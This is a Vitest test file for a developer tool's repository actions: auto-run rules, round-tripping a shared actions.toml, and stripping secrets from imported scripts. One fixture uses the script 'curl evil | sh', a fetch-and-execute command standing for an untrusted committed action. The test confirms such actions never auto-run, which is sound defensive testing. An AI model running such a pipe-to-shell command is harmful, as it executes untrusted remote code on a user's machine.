import { describe, expect, it } from 'vitest'
import {
  autoRunActionFor,
  formatSharedActions,
  parseImportedAction,
  parseSharedActions,
  SHARED_ACTIONS_FILES,
  sharedActionsFileFor,
  stripScriptSecrets
} from './repo-actions'
import { FORK_HOME_FOLDER_NAME } from '../fork-identity'
import { IMPORTED_ACTION_HEADER_PREFIX } from '../import-source-app'

describe('auto-run after setup', () => {
  const committed = {
    id: 'shared:0:start',
    name: 'Start',
    script: 'curl evil | sh',
    targets: ['local' as const],
    shared: true
  }
  const own = {
    id: 'mine',
    name: 'Dev',
    script: 'npm run dev',
    targets: ['local' as const],
    shared: false
  }
  const cloudOnly = {
    id: 'c',
    name: 'Cloud',
    script: 'x',
    targets: ['cloud' as const],
    shared: false
  }

  it('never starts an action from the repository files the person has not run', () => {
    expect(autoRunActionFor([committed], null)).toBeUndefined()
    expect(autoRunActionFor([committed, cloudOnly], null)).toBeUndefined()
    expect(autoRunActionFor([committed, own], null)).toBe(own)
  })

  it('starts the action the person last ran, shared or not', () => {
    expect(autoRunActionFor([committed, own], 'local:shared:0:start')).toBe(committed)
    expect(autoRunActionFor([committed, own], 'local:gone')).toBe(own)
  })
})

describe('repo actions', () => {
  it('reads the app-named actions file first and keeps a repository on the file it has', () => {
    const [named, legacy] = SHARED_ACTIONS_FILES
    expect(named).toBe(`.${FORK_HOME_FOLDER_NAME}/actions.toml`)
    expect(legacy).toBe('.orca/actions.toml')
    expect(sharedActionsFileFor(() => false)).toBe(named)
    expect(sharedActionsFileFor(() => true)).toBe(named)
    expect(sharedActionsFileFor((file) => file === legacy)).toBe(legacy)
  })

  it('round-trips shared actions through .orca/actions.toml', () => {
    const text = formatSharedActions([
      {
        id: 'x',
        name: 'Restart dev server',
        script: "pkill -f 'node.*server.js'\nnpm run dev",
        targets: ['local', 'cloud'],
        shared: true
      }
    ])
    const [action] = parseSharedActions(text)
    expect(action).toMatchObject({
      name: 'Restart dev server',
      script: "pkill -f 'node.*server.js'\nnpm run dev",
      targets: ['local', 'cloud'],
      shared: true
    })
  })

  it('keeps a known icon through .orca/actions.toml and drops an unknown one', () => {
    const text = formatSharedActions([
      {
        id: 'a',
        name: 'Deploy',
        script: 'make deploy',
        targets: ['local'],
        shared: true,
        icon: 'rocket'
      },
      { id: 'b', name: 'Test', script: 'make test', targets: ['local'], shared: true }
    ])
    const [deploy, test] = parseSharedActions(text)
    expect(deploy?.icon).toBe('rocket')
    expect(test).not.toHaveProperty('icon')
    const [odd] = parseSharedActions('[[action]]\nname = "X"\nscript = "x"\nicon = "nope"\n')
    expect(odd).not.toHaveProperty('icon')
  })

  it('never keeps a secret literal from an imported script', () => {
    const { script, variables } = stripScriptSecrets(
      [
        'EMAIL="demo@example.com"',
        'PASSWORD="***"',
        'export CLIENT_SECRET="${CLIENT_SECRET:-abc123}"',
        'export CLIENT_ID="${CLIENT_ID:-public-id}"',
        'API_KEY=sk-live-123',
        'LOCAL_KEY=$(grep KEY .env)'
      ].join('\n')
    )
    expect(variables).toEqual(['PASSWORD', 'CLIENT_SECRET', 'API_KEY'])
    expect(script).not.toMatch(/abc123|sk-live-123|\*\*\*/)
    expect(script).toContain('EMAIL="demo@example.com"')
    expect(script).toContain('CLIENT_ID="${CLIENT_ID:-public-id}"')
    expect(script).toContain('LOCAL_KEY=$(grep KEY .env)')
    expect(script).toContain('PASSWORD="${PASSWORD:?')
  })

  it('reads the name and "Can run in" choices from an imported export', () => {
    expect(
      parseImportedAction(`${IMPORTED_ACTION_HEADER_PREFIX} "Log in" (cloud=1 local=0)\necho hi\n`)
    ).toEqual({
      name: 'Log in',
      targets: ['cloud'],
      script: 'echo hi\n'
    })
    expect(parseImportedAction('echo hi').name).toBeNull()
  })
})
